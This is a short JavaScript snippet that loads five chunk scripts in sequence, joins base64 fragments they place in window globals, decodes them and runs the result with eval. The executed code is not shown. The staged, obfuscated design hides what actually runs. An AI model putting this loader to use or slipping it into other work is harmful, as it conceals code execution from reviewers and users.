(function(){
  function load(src){return new Promise(function(res,rej){var s=document.createElement('script');s.src=src;s.onload=res;s.onerror=rej;document.head.appendChild(s);});}
  var files=['chunk0.js','chunk1.js','chunk2.js','chunk3.js','chunk4.js'];
  files.reduce(function(p,f){return p.then(function(){return load(f);});}, Promise.resolve())
    .then(function(){
      var b=window.__C0+window.__C1+window.__C2+window.__C3+window.__C4;
      eval(decodeURIComponent(escape(atob(b))));
    })
    .catch(function(e){console.error(e);});
})();
